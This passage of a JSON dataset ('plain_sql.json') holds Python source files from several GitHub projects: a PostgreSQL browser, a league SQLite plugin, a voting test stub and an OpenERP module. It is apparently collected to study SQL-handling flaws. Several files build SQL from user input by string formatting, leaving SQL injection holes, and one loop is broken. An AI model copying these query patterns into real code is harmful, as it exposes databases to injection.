parser.add_option(\"-g\",\"--grid\",action=\"store\",dest=\"grid\",help=\"grid size expressed in epsg unit *\")\n    parser.add_option(\"-d\", \"--days\", action=\"store\", dest=\"days\", help=\"users in the last N days *\")    \n    parser.add_option(\"-t\", \"--tags\", action=\"store\", dest=\"tags\", help=\"txt file with the list of tags to search *\")    \n    (options,args) = parser.parse_args()\n    if not options.create:\n        if ((options.input) and (options.output) != None) or (options.config != None):\n            execMVP(options)\n        else:\n            parser.print_help()\n            print \"* override the config file\"\n            sys.exit(0)            \n    else:\n        try:        \n            f = open(os.getcwd() + os.path.sep + TEMPLATECONFIG, 'w')\n            f.write(\"[config]\\n\")\n            f.write(\"epsg: 900913\\n\")\n            f.write(\"grid: 1000\\n\")\n            f.write(\"days: 180\\n\")\n            f.write(\"[goodtags]\\n\")\n            f.write(\"file: conf/goodtags.txt\\n\")\n            f.write(\"[indb]\\n\")\n            f.write(\"infile:data/file.sqlite\\n\")\n            f.write(\"[outdb]\\n\")\n            f.write(\"outfile:data/mvposm.sqlite\")\n            f.close()\n        except OSError, e:\n            print \"Error \" + e\n            sys.exit(2)\n            \n        \nif __name__ == \"__main__\":\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kmoppel/pgzebra/blob/e3aa8dc220a5950eeadd6911452173dea55fb893",
        "file_path": "/src/frontend.py",
        "source": "import cherrypy\nfrom jinja2 import Environment, FileSystemLoader\nimport os\nimport json\nimport csv\nimport time\nfrom cherrypy.lib import file_generator\nimport StringIO\nimport random\nimport datetime\n\nimport datadb\nfrom urlparams import UrlParams\n\nenv = Environment(loader=FileSystemLoader(os.path.join(os.path.dirname(__file__), 'templates')))\n\n\ndef fill_timeline_holes(data, bucket, db_uniq):\n    \"\"\" fills gaps with zeroes between min and max with help of database\n    data: [(datetime, count),...], bucket: [min|hour|day|week|month]\n      TODO can be actually added to the initial select\n    \"\"\"\n\n    if len(data) <= 1:\n        return data\n\n    data_as_dict = {}\n    for d in data:\n        data_as_dict[d[0]] = d\n    ret_data = []\n    sql = \"select generate_series(%s, %s, '1{}'::interval)\".format(bucket)\n    time_series, col_names, error = datadb.execute_on_db_uniq(db_uniq, sql, (data[0][0], data[-1][0]))\n    if error:\n        raise Exception(error)\n    for s in time_series:\n        ret_data.append(data_as_dict.get(s[0], (s[0], 0L)))\n    return ret_data\n\n\nclass Frontend(object):\n\n    def __init__(self, features):\n        self.features = features\n\n    @cherrypy.expose\n    def normalizeurl(self, *args):\n        if len(args) < 2:\n            raise Exception('Needs a table already')\n        print 'normalized_url args', args\n        urlparams = UrlParams(datadb.object_cache, self.features, *args)\n        print 'normalized_url', urlparams.get_normalized_url()\n        return urlparams.get_normalized_url()\n\n    @cherrypy.expose\n    def default(self, *args):\n        if len(args) == 0:  # show all dbs\n            return self.list_all_dbs()\n        elif len(args) == 1:  # show all tables for a db\n            return self.list_all_tables(args[0])\n\n        message = ''\n        print 'args', args\n        urlparams = UrlParams(datadb.object_cache, self.features, *args)\n        print 'up', urlparams\n        sql = urlparams.to_sql()\n        print 'sql', sql\n\n        data, column_names, error = datadb.execute_on_db_uniq(urlparams.db_uniq, sql)\n        if error:\n            raise Exception('Error executing the query: ' + error)\n        # print 'data', data\n        column_info = datadb.get_column_info(urlparams.db_uniq, urlparams.table, column_names)  # TODO highlight PK in UI\n\n        if urlparams.output_format == 'json':\n            # stringify everything, not to get \"is not JSON serializable\"\n            stringified = []\n            for row in data:\n                stringified.append([str(x) for x in row])   # TODO better to cast all cols to ::text in SQL?\n            return json.dumps(stringified)\n        elif urlparams.output_format in ['graph', 'png']:\n            return self.plot_graph(data, urlparams)\n        elif urlparams.output_format == 'csv':\n            return self.to_csv(data, column_names, urlparams)\n        else:\n            tmpl = env.get_template('index.html')\n            return tmpl.render(message=message, dbname=urlparams.dbname, table=urlparams.table, sql=sql, data=data,\n                               column_info=column_info, max_text_length=self.features['maximum_text_column_length'])\n\n    def list_all_dbs(self, output_format='html'):\n        db_uniqs = datadb.object_cache.cache.keys()\n        db_info = []\n        for u in db_uniqs:\n            splits = u.split(':')\n            db_info.append({'hostname': splits[0], 'port': splits[1], 'dbname': splits[2]})\n        db_info.sort(key=lambda x:x['dbname'])\n\n        if output_format == 'json':\n            return json.dumps(db_info)\n        else:\n            tmpl = env.get_template('dbs.html')\n            return tmpl.render(message='', db_info=db_info)\n\n    def list_all_tables(self, dbname, output_format='html'):\n        db_uniq, table = datadb.object_cache.get_dbuniq_and_table_full_name(dbname)\n        if not db_uniq:\n            raise Exception('Database {} not found! Available DBs: {}'.format(dbname, datadb.object_cache.cache.keys()))\n        hostname, port, db = tuple(db_uniq.split(':'))\n        tables = datadb.object_cache.get_all_tables_for_dbuniq(db_uniq)\n        tables.sort()\n        # print 'tables', tables\n\n        if output_format == 'json':\n            return json.dumps(tables)\n        else:\n            tmpl = env.get_template('tables.html')\n            return tmpl.render(message='', dbname=db, hostname=hostname, port=port, tables=tables)\n\n    def plot_graph(self, data, urlparams):\n        line_data = []\n        pie_data = []\n\n        limit = int(urlparams.limit)\n        if urlparams.graphtype == 'pie' and len(data) > limit and limit > 1:    # formulate an artificial 'other' group with values > 'limit'\n            sum = 0L\n            for k, v in data[limit-1:]:\n                sum += v\n            data[limit-1:] = [('Other', sum)]\n\n        if urlparams.output_format == 'graph':\n            if urlparams.graphtype == 'line':\n                line_data = fill_timeline_holes(data, urlparams.graphbucket, urlparams.db_uniq)\n                line_data = [(int(time.mktime(p[0].timetuple()) * 1000), p[1]) for p in line_data]\n                line_data = json.dumps(line_data)\n            elif urlparams.graphtype == 'pie':\n                for d in data:\n                    pie_data.append({'label': str(d[0]), 'data': [d[1]]})\n                pie_data = json.dumps(pie_data)\n\n            tmpl = env.get_template('graph.html')\n            return tmpl.render(line_data=line_data, pie_data=pie_data, graph_type=urlparams.graphtype, table=urlparams.table)\n        elif urlparams.output_format == 'png':\n            chart = None\n            if urlparams.graphtype == 'line':\n                line_data = fill_timeline_holes(data, urlparams.graphbucket, urlparams.db_uniq)\n                import pygal\n                chart = pygal.Line(width=1000)\n                chart.title = 'Counts of {} over 1{} slots'.format(urlparams.graphkey, urlparams.graphbucket)\n                labels = []\n                mod_constant = 10 if len(line_data) < 100 else (30 if len(line_data) < 1000 else 1000)\n                for i, d in enumerate(line_data):\n                    if i == 0 or i == len(line_data)-1:\n                        labels.append(d[0].strftime('%m-%d %H:%M'))\n                        continue\n                    if i % mod_constant == 0:\n                        labels.append(d[0].strftime('%m-%d %H:%M'))\n                chart.x_labels = labels\n                chart.add('Count', [v for t, v in line_data])\n            elif urlparams.graphtype == 'pie':\n                import pygal\n                chart = pygal.Pie()\n                chart.title = 'Distribution of {} values'.format(urlparams.graphkey)\n                for key, count in data:\n                    chart.add(str(key), count)\n\n            random_file_path = '/tmp/pgzebra{}.png'.format(random.random())\n            chart.render_to_png(random_file_path)\n            output = StringIO.StringIO(open(random_file_path).read())   # should be possible to skip this step also?\n            os.unlink(random_file_path)\n\n            cherrypy.response.headers['Content-Type'] = 'image/png'\n            return file_generator(output)\n\n    def to_csv(self, data, column_names, urlparams):\n        csvfile = StringIO.StringIO()\n        writer = csv.writer(csvfile, delimiter=';', quotechar='\"', quoting=csv.QUOTE_ALL)\n        writer.writerow(column_names)\n        writer.writerows(data)\n        cherrypy.response.headers['Content-Type'] = 'text/csv'\n        cherrypy.response.headers['Content-Disposition'] = 'attachment; filename=\"{}_{}.csv\"'.format(urlparams.table,\n                                                                                                     datetime.datetime.now().strftime('%Y-%m-%d_%H%M'))\n        return csvfile.getvalue()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kmoppel/pgzebra/blob/e3aa8dc220a5950eeadd6911452173dea55fb893",
        "file_path": "/src/urlparams.py",
        "source": "from dbobject_cache import DBObjectsCache\n\n\nclass UrlParams(object):\n\n    def __init__(self, object_cache, features, *args):\n        \"\"\" :type object_cache : dbobject_cache.DBObjectsCache \"\"\"\n        self.object_cache = object_cache\n        self.features = features\n        self.db_uniq = None\n        self.dbname = None\n        self.table = None\n        self.column_names = []\n        self.filters = []     # [(col_short, op, value),]  op: eq/=, gt/>\n        self.aggregations = []     # [(operator, column),]  op: count, sum, min, max\n        self.joinitems = {}\n        self.graphtype = None\n        self.graphkey = None\n        self.graphbucket = None\n        self.limit = features.get('default_limit', 20)\n        self.order_by_direction = features.get('default_order_by', 'DESC')\n        self.order_by_columns = []\n        self.output_format = features.get('default_format', 'html')\n\n        # return args\n        args_count = len(args)\n        if args_count < 2:\n            raise Exception('Invalid arguments!')   # TODO add more checks, lose 500. separate exception subclass?\n\n        self.db_uniq, self.table = object_cache.get_dbuniq_and_table_full_name(args[0], args[1])\n        if not (self.db_uniq and self.table):\n            raise Exception('DB or Table not found!')   # TODO suggest similar tables if only table\n        self.column_names = [x['column_name'] for x in object_cache.cache[self.db_uniq][self.table]]\n        self.dbname = self.db_uniq.split(':')[2]\n\n        current_arg_counter = 2\n        while current_arg_counter < args_count:\n            current_arg = args[current_arg_counter]\n            next_arg = None\n            next_2nd = None\n            has_next = args_count > current_arg_counter + 1\n            if has_next: next_arg = args[current_arg_counter + 1]\n            has_2nd = args_count > current_arg_counter + 2\n            if has_2nd: next_2nd = args[current_arg_counter + 2]\n\n            # output_format\n            if current_arg == 'f' or current_arg == 'format':\n                if has_next and next_arg in ['c', 'csv', 'j', 'json', 'h', 'html', 'g', 'graph', 'png']:\n                    if next_arg[0] == 'c':\n                        self.output_format = 'csv'\n                    elif next_arg[0] == 'j':\n                        self.output_format = 'json'\n                    elif next_arg[0] == 'g' and has_2nd and next_2nd in ['l', 'line', 'p', 'pie']:\n                        self.output_format = 'graph'\n                        self.graphtype = 'pie' if next_2nd[0] == 'p' else 'line'\n                        current_arg_counter += 3\n                        continue\n                    elif next_arg == 'png' and has_2nd and next_2nd in ['l', 'line', 'p', 'pie']:\n                        self.output_format = 'png'\n                        self.graphtype = 'pie' if next_2nd[0] == 'p' else 'line'\n                        current_arg_counter += 3\n                        continue\n                    else:\n                        self.output_format = 'html'\n                    current_arg_counter += 2\n                    continue\n\n            # limit\n            if current_arg == 'l' or current_arg == 'limit':\n                if has_next and str(next_arg).isdigit():\n                    self.limit = next_arg\n                    current_arg_counter += 2\n                    continue\n\n            # order by\n            #   : o[rderby]\n            #   : o/[asc|desc]\n            #   : o/[c|m]\n            #   : o/[c|m][asc|desc]\n            #   : o[rderby]/columnpattern[,pattern2]/[asc|desc]\n            # TODO multicolumn, comma separated\n            if current_arg == 'o' or current_arg == 'orderby':\n                if has_2nd and next_2nd in ['a', 'asc', 'd', 'desc']:\n                    if next_arg in ['c', 'created']:\n                        self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['created_patterns'])]\n                    elif next_arg in ['m', 'modified']:\n                        self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['modified_patterns'])]\n                    else:\n                        self.order_by_columns = self.object_cache.get_column_multi(self.db_uniq, self.table, next_arg)\n                    if not self.order_by_columns:\n                        raise Exception('Order By column {} not found! Known columns: {}'.format(next_arg, self.column_names))\n                    if next_2nd in ['a', 'asc']:\n                        self.order_by_direction = 'ASC' if next_2nd[0] == 'a' else 'DESC'\n                    current_arg_counter += 3\n                    continue\n                elif has_next and next_arg in ['a', 'asc', 'd', 'desc']:\n                    self.order_by_columns = [self.column_names[0]]  # 1st col by default TODO use PK\n                    self.order_by_direction = 'ASC' if next_arg[0] == 'a' else 'DESC'\n                    current_arg_counter += 2\n                    continue\n                elif has_next and next_arg in ['c', 'created','m', 'modified'] and (not has_2nd or next_2nd not in ['a','asc','d','desc']):\n                        if next_arg[0] == 'c':\n                            self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['created_patterns'])]\n                        else:\n                            self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['modified_patterns'])]\n                        current_arg_counter += 2\n                        continue\n                elif has_next and object_cache.get_column_multi(self.db_uniq, self.table, next_arg):    # /o/col1,col2\n                    columns = object_cache.get_column_multi(self.db_uniq, self.table, next_arg)\n                    if columns:\n                        self.order_by_columns = columns\n                        current_arg_counter += 2\n                        continue\n                else:\n                    self.order_by_columns = [self.column_names[0]]  # 1st col by default TODO use PK\n                    current_arg_counter += 1\n                    continue\n\n            # filters\n            # /column/>/val\n            # TODO add special keywords like today?\n\n            if has_next and has_2nd:\n                if next_arg.upper() in ['<', '<=', '>', '>=', '=', 'EQ', 'LT', 'LTE', 'GT', 'GTE',\n                                        'IS', 'IS NOT', 'ISNOT', 'IN']:\n                    next_arg = next_arg.upper()\n                    column = self.object_cache.get_column_single(self.db_uniq, self.table, current_arg)\n                    if not column:\n                        raise Exception('Column {} not found!'.format(current_arg))\n                    if next_arg in ['IS', 'IS NOT', 'ISNOT']:\n                        if next_2nd.upper() != 'NULL':\n                            raise Exception('is/isnot requires NULL as next parameter!')\n                        next_2nd = next_2nd.upper()\n                    print next_arg\n                    next_arg = next_arg.replace('ISNOT', 'IS NOT')\n                    next_arg = next_arg.replace('EQ', '=')\n                    next_arg = next_arg.replace('LTE', '<=')\n                    next_arg = next_arg.replace('LT', '<')\n                    next_arg = next_arg.replace('GTE', '>=')\n                    next_arg = next_arg.replace('GT', '>')\n                    print next_arg\n                    if next_arg == 'IN':\n                        self.filters.append((column, next_arg, '(' + next_2nd + ')'))\n                    else:\n                        self.filters.append((column, next_arg, next_2nd))\n                    current_arg_counter += 3\n                    continue\n\n            # simple aggregations\n            # count, sum, min, max\n            if current_arg == 'agg' and has_2nd and next_arg in ['count', 'sum', 'min', 'max']:\n                agg_col = self.object_cache.get_column_single(self.db_uniq, self.table, next_2nd)\n                self.aggregations.append((next_arg, agg_col))\n                current_arg_counter += 3\n                continue\n\n            # simple graphs\n            # /gkey/col\n            if current_arg in ['gk', 'gkey'] and has_next:\n                self.graphkey = self.object_cache.get_column_single(self.db_uniq, self.table, next_arg)\n                current_arg_counter += 2\n                continue\n            # /gbucket/1h   [1month,1d,1h,1min]\n            if current_arg in ['gb', 'gbucket'] and has_next and next_arg in ['month', 'day', 'hour', 'min', 'minute']:\n                self.graphbucket = next_arg\n                current_arg_counter += 2\n                continue\n\n\n            print 'WARNING: did not make use of ', current_arg\n            current_arg_counter += 1\n\n    def do_pre_sql_check(self): # TODO sql injection analyze. use psycopg2 mogrify?\n        if self.graphtype == 'line' and not self.graphbucket:\n            raise Exception('gbucket/gb parameter missing! [ allowed values: month, week, day, hour, minute]')\n\n    def to_sql(self):\n        self.do_pre_sql_check()\n        sql = 'SELECT '\n        if self.aggregations:\n            i = 0\n            for agg_op, column in self.aggregations:\n                sql += ('' if i == 0 else ', ') + agg_op + '(' + column + ')'\n                i += 1\n        elif self.output_format in ['graph', 'png']:\n            if self.graphtype == 'line':\n                sql += \"date_trunc('{}', {}), count(*)\".format(self.graphbucket, self.graphkey)\n            else:\n                sql += \"{}, count(*)\".format(self.graphkey)\n        else:\n            sql += ', '.join(self.column_names)\n\n        sql += ' FROM ' + self.table\n        if self.filters:\n            sql += ' WHERE '\n            i = 0\n            for fcol, fop, fval in self.filters:\n                col_full_name = self.object_cache.get_column_single(self.db_uniq, self.table, fcol)\n                if not col_full_name:\n                    raise Exception('Column {} not found! Known columns: {}'.format(fcol, self.column_names))\n                sql += '{}{} {} {}'.format((' AND ' if i > 0 else ''), col_full_name, fop.upper(), fval)\n                i += 1\n\n        if self.graphkey:\n            if self.graphtype == 'line':\n                sql += ' GROUP BY 1 ORDER BY 1'\n            elif self.graphtype == 'pie':\n                sql += ' GROUP BY 1 ORDER BY 2 DESC'    # LIMIT {}'.format(self.limit)\n        elif not self.aggregations:\n            if self.order_by_columns:\n                if isinstance(self.order_by_columns, list):\n                    sql += ' ORDER BY '\n                    order_bys = []\n                    for col in self.order_by_columns:\n                        order_bys.append('{} {}'.format(col, self.order_by_direction.upper()))\n                    sql += ', '.join(order_bys)\n                else:\n                    sql += ' ORDER BY {} {}'.format(self.order_by_columns, self.order_by_direction.upper())\n            sql += ' LIMIT {}'.format(self.limit)\n        return sql\n\n    def get_normalized_url(self):\n        url = '/' + '/'.join([self.dbname, self.table, 'output', self.output_format])\n        if self.output_format in ['graph', 'png']:\n            url += '/' + self.graphtype\n            if self.graphkey:\n                url += '/{}/{}'.format('graphkey', self.graphkey)\n            if self.graphbucket:\n                url += '/{}/{}'.format('gbucket', self.graphbucket)\n        for column, op, value in self.filters:\n            url += '/{}/{}/{}'.format(column, op, value)\n        if self.output_format not in ['graph', 'png']:\n            if self.order_by_columns:\n                url += ('/{}/{}/{}'.format('orderby', ','.join(self.order_by_columns), self.order_by_direction)).lower()\n            elif self.order_by_direction:\n                url += ('/{}/{}'.format('orderby', self.order_by_direction)).lower()\n        url += '/{}/{}'.format('limit', self.limit)\n        return url\n\n    def __str__(self):\n        return 'UrlParams: db = {}, table = {}, columns = {}, filters = {}, order_by_columns = {},' \\\n            ' output_format = {}, graphtype = {}, gkey = {}, gbucket = {}, limit = {}'.format(self.db_uniq, self.table,\n                                                                                 self.column_names, self.filters,\n                                                                                 self.order_by_columns, self.output_format,\n                                                                                 self.graphtype, self.graphkey,\n                                                                                 self.graphbucket, self.limit)\n\n\nif __name__ == '__main__':\n    db_objects_cache = DBObjectsCache()\n    db_objects_cache.add_table_to_cache('local', 5432, 'postgres',\n                                        'public.table1',\n                                        DBObjectsCache.formulate_table(['col1', 'col2', 't_created']))\n    print db_objects_cache\n\n    features = {\n        'default_order_by': 'DESC',\n        'default_limit': '20',\n        'created_patterns': 'created,timestamp,time',\n        'modified_patterns': 'modified,updated,timestamp',\n    }\n    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'l', '100', 'o', 'd')\n    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'o', 'm', 'f', 'h', 'col1', '<=', '1')\n    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'col1', '<=', '100', 'agg', 'count', 'c1', 'agg', 'max', 'c1')\n    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'f', 'g', 'l', 'gkey', 'created', 'gbucket', 'hour')\n    up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'f', 'g', 'pie', 'gkey', 'l1')\n    print up\n    print up.get_normalized_url()\n    print up.to_sql()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/iScrE4m/XLeague/blob/c7586856e56e34b7b2d648d129476bf46e0ea64f",
        "file_path": "/plugins/database.py",
        "source": "#!/usr/bin/env python\n\nimport sqlite3, os\n\nscript_dir = os.path.dirname(__file__)\nrel_path = \"database/main.db\"\ndatabase = sqlite3.connect(os.path.join(script_dir, rel_path), timeout=1)\ndatabase.row_factory = sqlite3.Row\ndb  = database.cursor()\n\ndef getPlayer(player):\n\tdb.execute(\"SELECT * FROM players WHERE Name = '%s' COLLATE NOCASE\" % player)\n\tplayerstats = dict(db.fetchone())\n\treturn playerstats\n\ndef ratingChange(Name, ELO, Played, W, L):\n\tdb.execute(\"UPDATE players SET ELO = %i, Played = %i, W = %i, L = %i WHERE Name = '%s' COLLATE NOCASE\" % (ELO, Played, W, L, Name))\n\tdatabase.commit()\n\ndef vouchPlayer(vouched):\n\tdb.execute(\"SELECT MAX(ID) as max_id from players\")\n\tplayer = db.fetchone()\n\tID = player[0]\n\tNewID = ID + 1\n\tdb.execute(\"INSERT INTO players VALUES (?, ?, 0, 1500, 0, 0, 0)\", (NewID, vouched))\n\tdatabase.commit()\n\ndef makeJudge(judge):\n\tdb.execute(\"UPDATE players SET Judge = 1 WHERE Name = '%s' COLLATE NOCASE\" % (judge)) \n\tdatabase.commit()\n\ndef getRunning():\n\tdb.execute(\"SELECT * FROM games WHERE Running = 'Yes'\")\n\trunning = db.fetchall()\n\treturn running\n\ndef GameNewPlayed(Played, ID):\n\tdb.execute(\"UPDATE games set GamesPlayed = %i WHERE ID = %i\" % (Played, ID))\n\tdatabase.commit()\n\ndef closeGame(ID):\n\tdb.execute(\"UPDATE games set Running = 'No' WHERE ID = %i\" % ID)\n\tdatabase.commit()\n\ndef getGameID(ID):\n\tdb.execute(\"SELECT * FROM games WHERE ID = %i\" % ID)\n\tID = db.fetchone()\n\treturn ID\n\ndef getGameNewID():\n\tdb.execute(\"SELECT MAX(ID) AS max_id FROM games\")\n\tgame = db.fetchone()\n\tNewID = int(game[0]) + 1\n\treturn NewID\n\ndef CreateGame(Pod):\n\tdb.execute(\"INSERT INTO games VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\", Pod)\n\tdatabase.commit()\n\nif __name__ == '__main__':\n    getRunning()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/trungnt6669/blockchain-voting/blob/b1f9fb0cb2b6863527cacfe6b0a811c36472e188",
        "file_path": "/SQLTest.py",
        "source": "import sqlite3\nimport os\nimport sys\n\n\n#The goal is to create three entries on the table: The name of the person (hashed), the address of the person (also hashed), and a bool value that checks if they're registered or not.\n#For the hash, a cryptographic hash would be optimal.\n\ndef create_table(table_name, arg_count, arg_values):\n    '''Takes a table name, a number of arguments count, and argument values.\n    Argument values are used for the individual table columns.'''\n    con = sqlite3.connect(\"something.db\")\n    con.isolation_level = None\n    cur = con.cursor()\n    buffer = \"\"\n    #Create the table.\n    arg_string = \" (\"\n    for i in range (0, arg_count):\n        #We have to process it as a string first.\n        if(i != arg_count):\n            #If it is not the last argument in the string, insert a comma.\n            arg_string += (arg_values[i] + \", \")\n        elif(i == arg_count):\n            #If it is the last argument in the string, insert a closing parentheses and semicolon.\n            arg_string += (arg_values[i] + \");\")\n    cur.execute(\"CREATE TABLE \" + table_name + arg_string)\n    #Now that we made the table and added the columns, we have to have functions to do other things like insert values.\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/xrg/OpenERP-addons/blob/989091c2691025c4a57927c7c730fb2b57d2adf7",
        "file_path": "/project/project.py",
        "source": "# -*- encoding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\t\n#    Copyright (C) 2004-2009 Tiny SPRL (<http://tiny.be>). All Rights Reserved\n#    $Id$\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU General Public License as published by\n#    the Free Software Foundation, either version 3 of the License, or\n#    (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU General Public License for more details.\n#\n#    You should have received a copy of the GNU General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom lxml import etree\nfrom mx import DateTime\nfrom mx.DateTime import now\nimport time\nfrom tools.translate import _\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass project(osv.osv):\n    _name = \"project.project\"\n    _description = \"Project\"\n\n    def _complete_name(self, cr, uid, ids, name, args, context):\n        res = {}\n        for m in self.browse(cr, uid, ids, context=context):\n            res[m.id] = (m.parent_id and (m.parent_id.name + '/') or '') + m.name\n        return res\n\n\n    def check_recursion(self, cursor, user, ids, parent=None):\n        return super(project, self).check_recursion(cursor, user, ids,\n                parent=parent)\n\n    def onchange_partner_id(self, cr, uid, ids, part):\n        if not part:\n            return {'value':{'contact_id': False, 'pricelist_id': False}}\n        addr = self.pool.get('res.partner').address_get(cr, uid, [part], ['contact'])\n\n        pricelist = self.pool.get('res.partner').browse(cr, uid, part).property_product_pricelist.id\n        return {'value':{'contact_id': addr['contact'], 'pricelist_id': pricelist}}\n\n    def _progress_rate(self, cr, uid, ids, names, arg, context=None):\n        res = {}.fromkeys(ids, 0.0)\n        progress = {}\n        if not ids:\n            return res\n        ids2 = self.search(cr, uid, [('parent_id','child_of',ids)])\n        if ids2:\n            cr.execute('''SELECT\n                    project_id, sum(planned_hours), sum(total_hours), sum(effective_hours)\n                FROM\n                    project_task \n                WHERE\n                    project_id in %s AND\n                    state<>'cancelled'\n                GROUP BY\n                    project_id''',\n                       (tuple(ids2),))\n            progress = dict(map(lambda x: (x[0], (x[1],x[2],x[3])), cr.fetchall()))\n        for project in self.browse(cr, uid, ids, context=context):\n            s = [0.0,0.0,0.0]\n            tocompute = [project]\n            while tocompute:\n                p = tocompute.pop()\n                tocompute += p.child_id\n                for i in range(3):\n                    s[i] += progress.get(p.id, (0.0,0.0,0.0))[i]\n            res[project.id] = {\n                'planned_hours': s[0],\n                'effective_hours': s[2],\n                'total_hours': s[1],\n                'progress_rate': s[1] and (100.0 * s[2] / s[1]) or 0.0\n            }\n        return res\n\n    def unlink(self, cr, uid, ids, *args, **kwargs):\n        for proj in self.browse(cr, uid, ids):\n            if proj.tasks:\n                raise osv.except_osv(_('Operation Not Permitted !'), _('You can not delete a project with tasks. I suggest you to deactivate it.'))\n        return super(project, self).unlink(cr, uid, ids, *args, **kwargs)\n    _columns = {\n        'name': fields.char(\"Project Name\", size=128, required=True),\n        'complete_name': fields.function(_complete_name, method=True, string=\"Project Name\", type='char', size=128),\n        'active': fields.boolean('Active'),\n        'category_id': fields.many2one('account.analytic.account','Analytic Account', help=\"Link this project to an analytic account if you need financial management on projects. It enables you to connect projects with budgets, planning, cost and revenue analysis, timesheets on projects, etc.\"),\n        'priority': fields.integer('Sequence'),\n        'manager': fields.many2one('res.users', 'Project Manager'),\n        'warn_manager': fields.boolean('Warn Manager', help=\"If you check this field, the project manager will receive a request each time a task is completed by his team.\"),\n        'members': fields.many2many('res.users', 'project_user_rel', 'project_id', 'uid', 'Project Members', help=\"Project's member. Not used in any computation, just for information purpose.\"),\n        'tasks': fields.one2many('project.task', 'project_id', \"Project tasks\"),\n        'parent_id': fields.many2one('project.project', 'Parent Project',\\\n            help=\"If you have [?] in the name, it means there are no analytic account linked to project.\"),\n        'child_id': fields.one2many('project.project', 'parent_id', 'Subproject'),\n        'planned_hours': fields.function(_progress_rate, multi=\"progress\", method=True, string='Planned Time', help=\"Sum of planned hours of all tasks related to this project.\"),\n        'effective_hours': fields.function(_progress_rate, multi=\"progress\", method=True, string='Time Spent', help=\"Sum of spent hours of all tasks related to this project.\"),\n        'total_hours': fields.function(_progress_rate, multi=\"progress\", method=True, string='Total Time', help=\"Sum of total hours of all tasks related to this project.\"),\n        'progress_rate': fields.function(_progress_rate, multi=\"progress\", method=True, string='Progress', type='float', help=\"Percent of tasks closed according to the total of tasks todo.\"),\n        'date_start': fields.date('Starting Date'),\n        'date_end': fields.date('Expected End'),\n        'partner_id': fields.many2one('res.partner', 'Partner'),\n        'contact_id': fields.many2one('res.partner.address', 'Contact'),\n        'warn_customer': fields.boolean('Warn Partner', help=\"If you check this, the user will have a popup when closing a task that propose a message to send by email to the customer.\"),\n        'warn_header': fields.text('Mail Header', help=\"Header added at the beginning of the email for the warning message sent to the customer when a task is closed.\"),\n        'warn_footer': fields.text('Mail Footer', help=\"Footer added at the beginning of the email for the warning message sent to the customer when a task is closed.\"),\n        'notes': fields.text('Notes', help=\"Internal description of the project.\"),\n        'timesheet_id': fields.many2one('hr.timesheet.group', 'Working Time', help=\"Timetable working hours to adjust the gantt diagram report\"),\n        'state': fields.selection([('template', 'Template'), ('open', 'Running'), ('pending', 'Pending'), ('cancelled', 'Cancelled'), ('done', 'Done')], 'State', required=True, readonly=True),\n     }\n\n    _defaults = {\n        'active': lambda *a: True,\n        'manager': lambda object,cr,uid,context: uid,\n        'priority': lambda *a: 1,\n        'date_start': lambda *a: time.strftime('%Y-%m-%d'),\n        'state': lambda *a: 'open'\n    }\n\n    _order = \"parent_id,priority,name\"\n    _constraints = [\n        (check_recursion, 'Error ! You can not create recursive projects.', ['parent_id'])\n    ]\n\n    # toggle activity of projects, their sub projects and their tasks\n    def set_template(self, cr, uid, ids, context={}):\n        res = self.setActive(cr, uid, ids, value=False, context=context) \n        return res\n\n    def set_done(self, cr, uid, ids, context={}):\n        self.write(cr, uid, ids, {'state':'done'}, context=context)\n        return True\n\n    def set_cancel(self, cr, uid, ids, context={}):\n        self.write(cr, uid, ids, {'state':'cancelled'}, context=context)\n        return True\n\n    def set_pending(self, cr, uid, ids, context={}):\n        self.write(cr, uid, ids, {'state':'pending'}, context=context)\n        return True\n\n    def set_open(self, cr, uid, ids, context={}):\n        self.write(cr, uid, ids, {'state':'open'}, context=context)\n        return True\n\n    def reset_project(self, cr, uid, ids, context={}):\n        res = self.setActive(cr, uid, ids,value=True, context=context)\n        return res\n\n    def copy(self, cr, uid, id, default={},context={}):\n        proj = self.browse(cr, uid, id, context=context)\n        default = default or {}\n        context['active_test'] = False\n        default['state'] = 'open'\n        if not default.get('name', False):\n            default['name'] = proj.name+_(' (copy)')\n        res = super(project, self).copy(cr, uid, id, default, context)\n        ids = self.search(cr, uid, [('parent_id','child_of', [res])])\n        cr.execute('update project_task set active=True where project_id in %s', (tuple(ids,)))\n        return res\n\n    def duplicate_template(self, cr, uid, ids,context={}):\n        default = {'parent_id': context.get('parent_id',False)}\n        for id in ids:\n            self.copy(cr, uid, id, default=default)\n        cr.commit()\n        raise osv.except_osv(_('Operation Done'), _('A new project has been created !\\nWe suggest you to close this one and work on this new project.'))\n\n    # set active value for a project, its sub projects and its tasks\n    def setActive(self, cr, uid, ids, value=True, context={}):   \n        for proj in self.browse(cr, uid, ids, context):            \n            self.write(cr, uid, [proj.id], {'state': value and 'open' or 'template'}, context)\n            cr.execute('select id from project_task where project_id=%s', (proj.id,))\n            tasks_id = [x[0] for x in cr.fetchall()]\n            if tasks_id:\n                self.pool.get('project.task').write(cr, uid, tasks_id, {'active': value}, context)\n            cr.execute('select id from project_project where parent_id=%s', (proj.id,))            \n            project_ids = [x[0] for x in cr.fetchall()]            \n            